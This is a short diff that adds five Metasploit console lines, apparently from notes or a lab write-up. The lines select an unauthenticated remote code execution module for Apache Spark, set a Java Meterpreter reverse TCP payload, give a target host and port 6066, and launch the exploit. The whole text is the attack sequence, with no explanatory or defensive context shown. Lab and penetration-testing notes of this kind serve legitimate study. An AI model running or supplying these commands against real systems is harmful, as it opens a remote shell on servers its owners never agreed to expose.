@@ -1,0 +1,5 @@
+msf5>use exploit/linux/http/spark_unauth_rce
+msf5>set payload java/meterpreter/reverse_tcp
+msf5>set rhost 192.168.100.2
+msf5>set rport 6066
+msf5>exploit 
